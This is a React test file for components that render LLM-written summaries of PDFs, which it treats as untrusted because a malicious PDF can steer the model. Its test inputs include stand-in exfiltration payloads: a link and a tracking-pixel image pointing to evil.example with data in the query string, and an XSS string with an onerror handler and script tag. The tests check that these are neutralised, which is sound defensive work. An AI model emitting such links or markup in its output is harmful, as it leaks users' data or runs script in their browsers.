import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import Markdown from './Markdown'
import RichText from './RichText'

// Model output is untrusted: a malicious PDF can steer what the model writes.
describe('Markdown (LLM output)', () => {
  it('renders the formatting used in summaries', () => {
    const { container } = render(
      <Markdown>{'**TL;DR**: works.\n\n- one\n- two\n\n| Model | BLEU |\n|---|---|\n| Transformer | 28.4 |'}</Markdown>,
    )

    expect(screen.getByText('TL;DR').tagName).toBe('STRONG')
    expect(screen.getAllByRole('listitem')).toHaveLength(2)
    expect(container.querySelector('table')).toHaveTextContent('Transformer28.4')
  })

  it('opens ordinary links in a new tab without a referrer', () => {
    render(<Markdown>{'See [the paper](https://arxiv.org/abs/1706.03762).'}</Markdown>)

    const link = screen.getByRole('link', { name: 'the paper' })
    expect(link).toHaveAttribute('href', 'https://arxiv.org/abs/1706.03762')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noreferrer')
  })

  it('does not make links that carry data in their query string clickable', () => {
    render(<Markdown>{'[Click here](https://evil.example/collect?email=me%40example.com)'}</Markdown>)

    expect(screen.queryByRole('link')).not.toBeInTheDocument()
    expect(screen.getByText('https://evil.example/collect?email=me%40example.com').tagName).toBe('CODE')
  })

  it('never loads images', () => {
    const { container } = render(<Markdown>{'![tracking pixel](https://evil.example/p.png?d=secret)'}</Markdown>)

    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByText('[image: tracking pixel]')).toBeInTheDocument()
  })

  it('does not render raw HTML', () => {
    const { container } = render(
      <Markdown>{'Hello <img src="https://evil.example/x.png" onerror="alert(1)"> <script>alert(1)</script>'}</Markdown>,
    )

    expect(container.querySelector('img, script')).toBeNull()
  })
})

describe('RichText (backend hints and errors)', () => {
  it('shows `backtick` spans as code', () => {
    const { container } = render(<RichText text="Run `claude auth login`, then `claude update`." />)

    expect(Array.from(container.querySelectorAll('code'), (c) => c.textContent)).toEqual(['claude auth login', 'claude update'])
    expect(container).toHaveTextContent('Run claude auth login, then claude update.')
  })

  it('leaves text without backticks alone', () => {
    const { container } = render(<RichText text="Plain <b>text</b> with a lone ` mark" />)

    expect(container.querySelector('code, b')).toBeNull()
    expect(container).toHaveTextContent('Plain <b>text</b> with a lone ` mark')
  })
})
